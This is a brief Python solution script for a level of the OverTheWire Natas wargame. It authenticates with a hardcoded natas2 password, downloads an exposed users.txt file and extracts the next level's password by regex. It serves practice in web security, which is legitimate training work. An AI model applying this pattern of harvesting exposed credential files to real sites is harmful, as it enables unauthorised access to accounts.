from bs4 import BeautifulSoup as bs
import requests
import re

u='natas2'
p='ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi'
l=f'http://{u}.natas.labs.overthewire.org/files/users.txt'
resp=requests.get(l,auth=(u, p))
t=resp.text

print(re.findall(r'natas3:(.*)',t)[0])
